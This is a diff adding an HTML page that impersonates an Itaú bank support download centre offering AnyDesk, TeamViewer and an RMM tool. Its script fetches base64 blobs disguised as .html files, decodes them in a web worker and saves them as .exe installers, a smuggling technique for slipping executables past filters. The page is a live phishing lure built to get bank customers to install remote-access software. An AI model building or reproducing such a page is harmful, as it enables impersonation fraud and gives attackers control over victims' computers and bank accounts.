@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+
+<html class="webp"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>Itau Suporte - Central de Software</title>
+        <meta name="description" content="Central de Download de Ferramentas de Suporte.">
+        
+        <meta property="og:title" content="Itau Unibanco">
+        <meta property="og:url" content="suporte.html">
+        <meta property="og:type" content="website">
+        <link rel="canonical" href="https://itau-suporte.azureedge.net/suporte.html">
+        <link rel="icon" href="https://itau-suporte.azureedge.net/content/images/logos/favicon.ico" type="image/x-icon">
+        <link rel="apple-touch-icon" href="https://itau-suporte.azureedge.net/content/images/logos/apple-touch-icon.png">
+        <link href="./content/pslandingpages.css" rel="stylesheet" type="text/css">
+        <link rel="preload" href="https://itau-suporte.azureedge.net/content/fonts/ps-icons-small/ps-icons-small5722.woff?td2uot" as="font" crossorigin="anonymous">
+        <link rel="preload" href="https://itau-suporte.azureedge.net/content/fonts/ps-main/ps-icons6208.woff?l1la2n" as="font" crossorigin="anonymous">
+
+       
+    <script id="ppas_container_configuration" data-appid="287552c2-4917-42e0-8982-ba994a2a73d7" data-host="ps.piwik.pro"></script></head>
+    <body class="theme-nomainsection">
+       
+        <header class="page-header" id="top">
+            <div class="container">
+                <a class="logo2" src="index.html">
+                    <p></p>
+                    <p></p>
+                    <img src="./images/itau-logo.png" height="124px" width="124px" class="logo-itau">
+                    <p></p>
+                    <p></p>
+                </a>
+            </div>
+        
+    </header>
+    
+    <div no-keyword-injection="" class="wrapper">
+        <div class="section-full-width theme-navy-1">
+            <h1 class="padding-bottom-small text-center" id="what-do-you-want-to-do">Softwares Disponiveis.</h1>
+            <div class="container-columns-block">
+                <div>
+                    <!--<h2 class="heading-3 heading-navy-1 text-center padding-top-small padding-bottom-tiny" id="hands-on-web-security-testing">AnyDesk</h2>-->
+                    <img src="./itau/images/AnyDesk-logo.png" style="height:220px">
+                    <!--<p class="heading-navy-1 text-center padding-top-tiny">Compatível com Windows 10 e versões anteriores, incluindo iOS, macOS, Linux e Android.</p>-->
+                    <div class="container-buttons margin-bottom-medium margin-top-small">
+                        <a class="button-orange" id="downloadBtn3">Download</a>
+                        <span class="hidden"></span>
+                    </div>
+                </div>
+                <div>
+                    <!--<h2 class="heading-3 heading-navy-1 text-center" id="free-up-testing-time-with-scalable-automated-scanning">TeamViewer</h2>-->
+                    <img src="./itau/images/TeamViewer-logo.png" style="height:220px">
+                    <!--<p class="heading-navy-1 text-center padding-top-tiny">Oferece suporte com auxílio de Inteligência Artificiall</p>-->
+                    <div class="container-buttons margin-bottom-medium margin-top-small">
+                        <a class="button-orange" id="downloadBtn2">Download</a>
+                        <span class="hidden"></span>
+                    </div>
+                </div>
+                <div>
+                    <!--<h2 class="heading-3 heading-navy-1 text-center" id="prevent-vulnerable-apps-from-hitting-production">RustDesk</h2>-->
+                    <img src="./itau/images/SentinelRMM.png" style="height:220px">
+                    <!--<p class="heading-navy-1 text-center padding-top-tiny">Suporte realizado de maneira segura e com uma conexão estável.</p>-->
+                    <div class="container-buttons margin-bottom-medium margin-top-small">
+                        <a class="button-orange" id="downloadBtn1">Download</a>
+                        <span class="hidden"></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+    function downloadFile(url, nomeArquivoFinal, mimeType = 'application/octet-stream') {
+
+      const absoluteUrl = new URL(url, window.location.href).href;
+      
+      const progressElement = document.createElement('div');
+      progressElement.innerHTML = `
+        <div style="position: fixed; top: 0; left: 0; right: 0; background: #f8f9fa; 
+                    padding: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 9999; text-align: center;">
+          <div id="progress-status">Processando arquivo...</div>
+          <div style="margin: 10px 0; height: 20px; background: #e9ecef; border-radius: 4px; overflow: hidden;">
+            <div id="download-progress-bar" style="height: 100%; width: 0%; background: #007bff; 
+                    transition: width 0.3s;"></div>
+          </div>
+          <div id="download-progress-text">Iniciando processamento...</div>
+        </div>
+      `;
+      document.body.appendChild(progressElement);
+      
+      const progressBar = document.getElementById('download-progress-bar');
+      const progressText = document.getElementById('download-progress-text');
+      const progressStatus = document.getElementById('progress-status');
+      
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', absoluteUrl, true);
+      xhr.responseType = 'arraybuffer'; 
+    
+      xhr.onprogress = function(event) {
+        if (event.lengthComputable) {
+          const percentComplete = Math.round((event.loaded / event.total) * 100);
+          progressBar.style.width = percentComplete + '%';
+          
+          const loaded = formatFileSize(event.loaded);
+          const total = formatFileSize(event.total);
+          progressText.textContent = `Baixando arquivo: ${percentComplete}% (${loaded} de ${total})`;
+        } else {
+          progressText.textContent = `Baixando: ${formatFileSize(event.loaded)}`;
+        }
+      };
+      
+      xhr.onload = function() {
+        if (this.status === 200) {
+  
+          progressStatus.textContent = 'Processando arquivo...';
+          progressText.textContent = 'Analisando arquivo...';
+          progressBar.style.width = '0%';
+          
+          const base64Text = new TextDecoder().decode(this.response);
+          
+          const base64Clean = base64Text.replace(/\s/g, '');
+          
+          const workerCode = `
+            function decodeBase64InChunks(base64Content, chunkSize) {
+              let processedChunks = 0;
+              const totalChunks = Math.ceil(base64Content.length / chunkSize);
+              const decodedChunks = [];
+              
+              for (let offset = 0; offset < base64Content.length; offset += chunkSize) {
+                let end = Math.min(offset + chunkSize, base64Content.length);
+                let chunk = base64Content.substring(offset, end);
+                
+                while (chunk.length % 4 !== 0 && offset + chunk.length < base64Content.length) {
+                  chunk += base64Content.charAt(offset + chunk.length);
+                  end++;
+                }
+
+                while (chunk.length % 4 !== 0) {
+                  chunk += '=';
+                }
+                
+                try {
+
+                  const binaryString = atob(chunk);
+                  const bytes = new Uint8Array(binaryString.length);
+                  
+                  for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                  }
+                  
+                  decodedChunks.push(bytes);
+                  
+                  processedChunks++;
+                  const progress = Math.round((processedChunks / totalChunks) * 100);
+                  self.postMessage({
+                    type: 'progress',
+                    progress: progress
+                  });
+                  
+                } catch (error) {
+                  self.postMessage({
+                    type: 'error',
+                    message: 'Erro ao decodificar base64: ' + error.message,
+                    offset: offset
+                  });
+                  return;
+                }
+              }
+              
+              self.postMessage({
+                type: 'complete',
+                chunks: decodedChunks
+              });
+            }
+            
+            self.onmessage = function(e) {
+              const { base64, chunkSize } = e.data;
+              decodeBase64InChunks(base64, chunkSize);
+            };
+          `;
+          
+          const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+          const workerUrl = URL.createObjectURL(workerBlob);
+          const worker = new Worker(workerUrl);
+          
+          worker.onmessage = function(e) {
+            const data = e.data;
+            
+            if (data.type === 'progress') {
+              progressBar.style.width = data.progress + '%';
+              progressText.textContent = `Analisando: ${data.progress}%`;
+            } 
+            else if (data.type === 'complete') {
+              progressStatus.textContent = 'Finalizando...';
+              progressBar.style.width = '100%';
+              progressText.textContent = 'Preparando arquivo...';
+              
+              const blob = new Blob(data.chunks, { type: mimeType });
+              
+              if (window.navigator && window.navigator.msSaveOrOpenBlob) {
+                window.navigator.msSaveOrOpenBlob(blob, nomeArquivoFinal);
+              } else {
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = nomeArquivoFinal;
+                document.body.appendChild(a);
+                a.click();
+                
+                setTimeout(function() {
+                  document.body.removeChild(a);
+                  window.URL.revokeObjectURL(url);
+                }, 100);
+              }
+              
+              worker.terminate();
+              URL.revokeObjectURL(workerUrl);
+              
+              setTimeout(function() {
+                document.body.removeChild(progressElement);
+              }, 1000);
+            }
+            else if (data.type === 'error') {
+
+              console.error('Erro na decodificação:', data.message, 'Offset:', data.offset);
+              progressStatus.textContent = 'Erro na decodificação';
+              progressBar.style.background = '#dc3545';
+              progressText.textContent = data.message;
+              
+              worker.terminate();
+              URL.revokeObjectURL(workerUrl);
+              
+              const retryButton = document.createElement('button');
+              retryButton.textContent = 'Tentar novamente';
+              retryButton.style = 'margin-top: 10px; padding: 5px 15px; background: #007bff; color: white; border: none; border-radius: 4px;';
+              retryButton.onclick = function() {
+                document.body.removeChild(progressElement);
+                baixarArquivoGrande(url, nomeArquivoFinal, mimeType);
+              };
+              progressElement.querySelector('div').appendChild(retryButton);
+            }
+          };
+          
+          worker.postMessage({
+            base64: base64Clean,
+            chunkSize: 1024 * 1024  
+          });
+          
+        } else {
+
+          progressStatus.textContent = 'Erro no download';
+          progressBar.style.background = '#dc3545';
+          progressText.textContent = `Erro ${this.status}: ${this.statusText}`;
+          
+          const retryButton = document.createElement('button');
+          retryButton.textContent = 'Tentar novamente';
+          retryButton.style = 'margin-top: 10px; padding: 5px 15px; background: #007bff; color: white; border: none; border-radius: 4px;';
+          retryButton.onclick = function() {
+            document.body.removeChild(progressElement);
+            baixarArquivoGrande(url, nomeArquivoFinal, mimeType);
+          };
+          progressElement.querySelector('div').appendChild(retryButton);
+        }
+      };
+      
+      xhr.onerror = function() {
+        progressStatus.textContent = 'Erro de conexão';
+        progressBar.style.background = '#dc3545';
+        progressText.textContent = 'Falha na conexão com o servidor';
+        
+        const retryButton = document.createElement('button');
+        retryButton.textContent = 'Tentar novamente';
+        retryButton.style = 'margin-top: 10px; padding: 5px 15px; background: #007bff; color: white; border: none; border-radius: 4px;';
+        retryButton.onclick = function() {
+          document.body.removeChild(progressElement);
+          baixarArquivoGrande(url, nomeArquivoFinal, mimeType);
+        };
+        progressElement.querySelector('div').appendChild(retryButton);
+      };
+      
+      xhr.send();
+    }
+
+    function formatFileSize(bytes) {
+      if (bytes === 0) return '0 Bytes';
+      const k = 1024;
+      const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+      const i = Math.floor(Math.log(bytes) / Math.log(k));
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('downloadBtn1').addEventListener('click', function() {
+        downloadFile("sentinel.html", "Sentinel Setup 12.4.0.exe", "application/octet-stream");
+      });
+
+      document.getElementById('downloadBtn2').addEventListener('click', function() {
+        downloadFile("teamviewer.html", "Teamviewer.exe", "application/octet-stream");
+      });
+
+      document.getElementById('downloadBtn3').addEventListener('click', function() {
+        downloadFile("anydesk.html", "Anydesk.exe", "application/octet-stream");
+      });
+
+    });
+       
+
+    </script>
+            
+
+            <footer class="wrapper">
+                <div class="container">
+                    <div>
+                        <p>Nossos Produtos</p>
+                        <a href="https://www.itau.com.br/">Página Principal</a>
+                        <a href="https://www.itau.com.br/contas/conta-corrente">Conta Corrente</a>
+                        <a href="https://www.itau.com.br/cartoes">Cartões de Crédito</a>
+                        <a href="https://www.itau.com.br/consorcios">Consórcio</a>
+                        <a href="https://www.itau.com.br/seguros">Seguros</a>
+                        <a href="https://www.itau.com.br/investimentos">Investimentos</a>
+                        <a href="https://www.itau.com.br/renegociacao">Renegociação</a>
+                    </div>
+                    <div>
+                        <p>Itaú</p>
+                        <a href="https://blog.itau.com.br/">Blog Itaú</a>
+                        <a href="https://carreiras.itau.com.br/">Carreiras</a>
+                        <a href="https://www.itau.com.br/imprensa">Imprensa</a>
+                        <a href="https://www.itau.com.br/sustentabilidade/">Sustentabilidade</a>
+                        <a href="https://www.itau.com.br/relacoes-com-investidores/integridade/#saiba">Integridade e Ética</a>
+                        <a href="https://www.itau.com.br/privacidade">Privacidade</a>
+                    </div>
+                    <div>
+                        <p>Ajuda</p>
+                        <a href="https://www.itau.com.br/atendimento-itau/para-voce">Central de ajuda</a>
+                        <a href="https://www.itau.com.br/canais-itau">Canais Itaú</a>
+                        <a href="https://www.itau.com.br/seguranca">Seguança</a>
+                    </div>
+                    <div>
+                        <p>Confira Também</p>
+                        <a href="https://www.itau.com.br/atendimento-itau/para-voce">Para você</a>
+                        <a href="https://www.itau.com.br/empresas">Para empresas</a>
+                        <a href="https://www.itau.com.br/poder-publico">Para poder público</a>
+                        <a href="https://www.itau.com.br/seguranca">Pacotes e tarifas</a>
+                    </div>
+                    <div>
+                        <p>Fale com o Itaú</p>
+                        <a href="https://www.itau.com.br/atendimento-itau/para-voce">Sac 0800 728 0728</a>
+                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/ouvidoria">Ouvidoria 0800 570 0011</a>
+                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/denuncia">Denúncia</a>
+                        <a href="https://www.itau.com.br/atendimento-itau/para-voce/envie-sua-mensagem">Envie sua mensagem</a>
+                    </div>
+                    <div>
+                        <a href="https://www.itau.com.br/"><img src="content/images/logos/itau-banner.png"class="footer-logo"></a>
+                        <a class="button-outline-blue-small camelcase" href="https://x.com/itau" rel="noreferrer"><span class="icon-twitter"></span>Fique por dentro</a>
+                        <p class="grey">&copy; 2025 Itau Unibanco.</p>
+                    </div>
+                </div>
+            </footer>
+            <a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63" /><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63" /></svg></a>
+        
+            </body>
+        </html>
